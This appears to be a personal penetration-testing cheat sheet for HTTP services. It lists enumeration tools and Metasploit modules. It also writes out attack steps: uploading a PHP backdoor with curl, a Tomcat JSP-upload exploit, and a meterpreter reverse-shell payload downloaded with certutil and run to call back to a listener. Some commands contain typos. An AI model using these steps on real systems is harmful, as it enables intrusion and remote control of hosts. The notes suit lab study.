# Table of Contents
1. [Overview](#Overview)
	1. Ports
	3. Usage
	4. Related Services
2. [Tools](#Tools)
	1. whatweb
	2. http
	3. dirb
	4. browsh
	5. lynx
	6. curl
	7. wget
	8. [nmap](#nmap)
	9. [msfconsole](#msfconsole)

---
# Overview

Used to host websites. 

## #Ports
- 80 : HTTP
- 443 : HTTPS
- 8080 : Common Alternative or proxy

## Usage
Use web-browser to access the site via hostname or IP.

## Related Services
- IIS : Windows HTTP Server
- NGINX : Server and Proxy
- Apache : server
- httpd : 

---
# #Tools

## whatweb
grabs information and runs tests
`wahtweb 192.168.32.3`

## http
grabs header information and html of page
`http 10.4.18.3`

## dirb
Will find directories that exists at the website using common built in wordlist using GET.
`dirb http://192.168.32.4`
```bash
dirb http:192.168.32.4 /user/share/metasploit-framework/wordlist/directory.txt
```

## browsh
website enumeration, will render website in ascii
`browsh --startup-url http://10.4.16.3/Default.aspx`
- ctrl-w : to exit

## lynx
similar to browsh, more text oriented

## curl
grabs the page from url
- `curl -v http:www.google.com`
- -I : get HEAD only
- -v : verbose
- -X OPTIONS : supported methods
- `curl http://192.168.8.1/uploads/ --upload-file /usr/share/webshells/php/simple-backdoor.php` : upload a file

## wget 
grabs files from url

---

## #nmap

```bash
nmap -p80 --script http-enum,http-headers,http-methods,http-webdav-scan --script-args url-path=/ 10.3.24.160
```
`nmap -sV -p80 10.34.5.3`
- --script
	- http-enum
		- will show some dir
	- http-headers
		- grabs http header information, shows service version info
	- http-methods
		- --script-args url-path=/webdav/
	- http-webdav-scan
		- --script-args url-path=/webdav/
	- banner
		- return banner, version info

---

## #msfconsole
### Metasploit Framework Console
- use auxiliary/scanner/http/http_version
	- `set rhosts 192.15.43.3`
	- `options`
	- `run`
- use auxiliary/scanner/http/brute_dirs
	- `set rhosts 192.165.2.3`
	- `options`
	- `run`
- use auxiliary/scanner/http/robots_txt
	- `set rhosts 192.168.32.3`
	- `run`
- `search tpye:exploit tomcat` : search for tomcat

#### Apache Tomcat Example
1. `use exploit/multi/http/tomcat_jsp_upload_bypass`
	1. info : shows that exploit uploads a java shell
	2. `set payload java/jsp_shell_bin_tcp`
	3. `show options` : will notice you have payload options to set
	4. will get basic cmd shell access
2. `msfvenom -p windows/meterpreter/reverse_tcp LHOST-10.10.5.4 LPORT=1234 -f exe > meterpreter.exe`
3. `sudo python -m SimpleHTTPServer 80` : host the payload
4. `certutil -urlcache -f http://10.10.5.4/meterpreter.exe meterpreter.exe` : use inbuilt tool to dl the payload
5. set up MSF handler with payload windows/meterpreter/reverse_tcp
6. `.\meterpreter.exe` : launch payload to connect to handler

### Useful Modules
- auxiliary/scanner/http/apache_userdir_enum
- auxiliary/scanner/http/brute_dirs
- auxiliary/scanner/http/dir_scanner
- auxiliary/scanner/http/dir_listing
- auxiliary/scanner/http/http_put
- auxiliary/scanner/http/files_dir
- auxiliary/scanner/http/http_login
- auxiliary/scanner/http/http_header
- auxiliary/scanner/http/http_version
- auxiliary/scanner/http/robots_txt



